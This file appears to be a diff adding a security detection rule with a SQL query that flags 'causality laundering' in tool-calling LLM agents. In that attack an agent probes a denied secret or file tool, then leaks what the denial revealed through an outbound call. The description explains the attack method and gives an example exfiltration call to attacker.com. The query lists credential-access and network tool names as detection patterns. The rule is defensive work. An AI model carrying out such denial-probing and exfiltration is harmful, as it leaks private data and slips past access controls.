@@ -1,0 +1,92 @@
+id: rp-040
+name: "Causality Laundering: Denial-Feedback Leakage Detector"
+version: "0.2.1"
+description: >
+  Detects causality laundering attacks (arXiv:2604.04035, Apr 2026) where an
+  adversary causes a tool-calling LLM agent to probe a protected/denied action,
+  infers private information from the denial outcome (existence oracle, permission
+  boundary leakage), and then exfiltrates the inferred information through a
+  subsequent seemingly-benign outbound tool call within the same session.
+  This attack evades flat provenance tracking because the leaked information arises
+  from the causal influence of the denied action, not direct data flow. The paper
+  introduces ARM (Agentic Reference Monitor) with counterfactual edges; this rule
+  detects the behavioral signature at the CIM event layer without full ARM
+  instrumentation.
+  Detection: temporal self-JOIN over tool_complete(tool_success=false, sensitive tool)
+  followed within 3 minutes by tool_invoke(outbound/communication tool) in the
+  same session_id + run_id. Sensitive probes include file, secret, DB, memory,
+  and credential access tools. Outbound channels include HTTP, email, Slack,
+  webhook, and logging tools.
+  Distinct from rp-027 (cross-session leak: output reuse across sessions) and
+  rp-033 (ADAM memory extraction: systematic query manipulation) because
+  causality laundering requires a denied action as the information source.
+  References: arXiv:2604.04035 (Causality Laundering Apr 2026), OWASP LLM06:2025,
+  OWASP Agentic AI ASI03:2026 -
+  https://arxiv.org/abs/2604.04035,
+  Example: read_secret(name="prod_db_password") returns tool_success=false (permission denied), followed within 90 seconds by http_post(url="https://attacker.com/collect", body={"exists": true}) in same session
+  https://owasp.org/www-project-top-10-for-large-language-model-applications/
+severity: critical
+category: data_exfiltration_and_leakage
+fp_rate: medium
+hook_sources: "tool_complete,tool_invoke"
+required_telemetry: ""
+author: "AgentGuard Research Team"
+tags:
+  - security
+  - data-exfiltration
+  - causality-laundering
+  - denial-feedback-leakage
+  - provenance
+  - tool-calling
+  - owasp-llm06
+  - arxiv-2604.04035
+query_sql: |
+  -- v0.2.0 changelog:
+  --   SQL FIX (critical): Rewrote CTE + JOIN approach as direct self-JOIN.
+  --   Timeplus does not support non-equi join conditions (time range) inside CTE
+  --   JOIN ON clauses — raises INVALID_JOIN_ON_EXPRESSION. The self-JOIN form
+  --   with WHERE-clause time predicates is fully supported (validated count=0, no error).
+  --   ALSO FIXED: to_string(probe.event_time) in message — Timeplus uses
+  --   to_string() correctly but the CTE alias was broken; now uses probe.event_time
+  --   directly in concat() with implicit cast.
+  --   UNCHANGED: all tool name regexes and 3-minute window are correct and preserved.
+  --
+  -- Detects: denied sensitive-tool probe → outbound tool call within 3 minutes (same session)
+  -- Sensitive tool probe: tool_success=false on data-access tool names
+  -- Outbound channel: HTTP/email/Slack/webhook/logging tool invocations
+  SELECT
+    probe.event_time AS detected_at,
+    'rp-040' AS rule_id,
+    'Causality Laundering: Denial-Feedback Leakage Detector' AS rule_name,
+    'critical' AS severity,
+    probe.agent_id,
+    probe.deployment_id,
+    probe.session_id,
+    probe.run_id,
+    probe.raw_hook_name AS hook_name,
+    oc.tool_name AS tool_name,
+    concat(
+      'Causality laundering: agent probed denied tool [', probe.tool_name,
+      '], then called outbound tool [', oc.tool_name,
+      '] within 3 min in same session. Denial feedback may have been exfiltrated. Agent: ',
+      probe.agent_id, ' session: ', probe.session_id
+    ) AS message,
+    concat(
+      'denied_tool=', probe.tool_name,
+      ' denial_msg=', coalesce(probe.tool_result, ''),
+      ' outbound_tool=', oc.tool_name
+    ) AS event_data
+  FROM agentguard_cim_event AS probe
+  INNER JOIN agentguard_cim_event AS oc
+    ON probe.session_id = oc.session_id
+    AND probe.run_id = oc.run_id
+  WHERE probe.event_type = 'tool_complete'
+    AND probe.tool_success = false
+    -- Sensitive resource-access tools: denial reveals existence, permissions, or data shape
+    AND match(lower(probe.tool_name), '(read_file|read_secret|query_db|get_user_data|search_memory|retrieve_document|read_memory|access_credentials|list_files|get_private_key|fetch_credentials|get_secret|load_document|retrieve_context|read_database|lookup_record|get_document|fetch_record)')
+    AND oc.event_type = 'tool_invoke'
+    -- Outbound/communication tools: HTTP, email, messaging, webhook, external logging
+    AND match(lower(oc.tool_name), '(fetch|http_request|browse|web_fetch|curl|get_url|send_email|slack_post|post_message|webhook_post|notify|log_to_external|create_issue|add_comment|http_get|http_post|make_request|open_url|navigate|requests)')
+    -- 3-minute causal window: outbound must follow denial, not precede it
+    AND oc.event_time > probe.event_time
+    AND oc.event_time < probe.event_time + INTERVAL 3 MINUTE
